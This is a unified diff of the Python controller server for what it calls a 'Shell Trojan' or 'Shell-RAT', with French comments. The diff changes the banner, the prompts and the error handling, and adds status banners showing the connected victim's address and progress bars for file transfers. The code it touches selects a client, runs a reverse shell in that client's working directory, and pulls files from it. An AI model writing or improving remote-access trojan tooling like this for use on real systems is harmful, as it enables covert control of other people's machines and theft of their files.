@@ -36,7 +36,7 @@ class Server:
         print("\n"+"="*80+"\n"+"+"*80)
         tprint(
             text=" Shell Trojan",
-            font='rnd-medium',
+            font='rnd-small',
         )
         print("\n"+"#"*80+"\n"+"-"*80)
 
@@ -114,10 +114,15 @@ class Server:
         """ Interface de communicatiomn avec le client """
         while True:
             try : 
-                command = input("\n\t>> [.-Shell-RAT-.]+++[-_-]  #>> ").strip() # Invite de commande 
+                command = input("\n\t>> [.-Shell-RAT-.]--[-_-]  #>> ").strip() # Invite de commande Serveur 
             except KeyboardInterrupt as e: 
                 print("\n\n")
-                conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
+                try : 
+                    conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
+                except KeyboardInterrupt as e: 
+                    print("\n\t\t Retour a l'interpreteur ! ")
+                    continue
+
                 if conf in ["yes",'oui','y','o']:
                     break
 
@@ -167,7 +172,6 @@ class Server:
         self.accept_connections()
         self.start_interpreter()
         
-        
     
     def start_reverse_shell(self):
         # Recuperer le repertoire de travail du client 
@@ -176,9 +180,27 @@ class Server:
         client_socket = self.clients[self.current_client]
 
         # Debut du shell reverse sur le client a partir du repertoire de travail du client 
+        print( "\n" ,
+               "+"*80 , 
+               "\n" , 
+               "-"*80,
+               '\n',
+               f" COMMUNICATION EN COURS AVEC LE CLIENT -->>[- {self.clients[self.current_client].getpeername()} -]<<-- ",
+               '\n',
+               "+"*80 , 
+               "\n" , 
+               "-"*80,
+               "\n"
+               )
         while True:
             # Prompt permettant d'entrer les commandes et de les envoyer aux clients  
-            command = input(f"{cwd} $> ")
+
+            try : 
+                command = input(f"\n\t{cwd} $)> ")
+            except EOFError as e: 
+                print(" \n\t [+][WARNING][+] INTERRUPTION BRUTAL DU SYSTEME NON AUTPRISER ! \n\t\t [+][info] Retourner sur l'interpreteur et taper la commande <exit> ou <quit> !")
+                continue
+
             if not command.strip():
                 # Commande vide 
                 continue
@@ -272,10 +294,7 @@ class Server:
         filesize = int(filesize)
         # Commencer la reception du fichier 
         # et ecrire les data dans un fichiers ouvert en stream 
-        if verbose:
-            progress = tqdm.tqdm(range(filesize), f"Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
-        else:
-            progress = None
+        progress = tqdm.tqdm(range(filesize), f"\n\t[+] Reception -->>[ {filename} ]<<-- ", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "wb") as f:
             while True:
                 bytes_read = s.recv(buffer_size)
@@ -294,7 +313,7 @@ class Server:
         s.send(f"{filename}{SEPARATOR}{filesize}".encode())
         # Commencer l'envoie 
         # Activer la barre de progression! Encore pour le kiFF :) :) :) :) ! AHHHHHHHHHHHHHH 
-        progress = tqdm.tqdm(range(filesize), f" [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
+        progress = tqdm.tqdm(range(filesize), f"\n\t[+] [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "rb") as f:
             while True:
                 bytes_read = f.read(buffer_size)
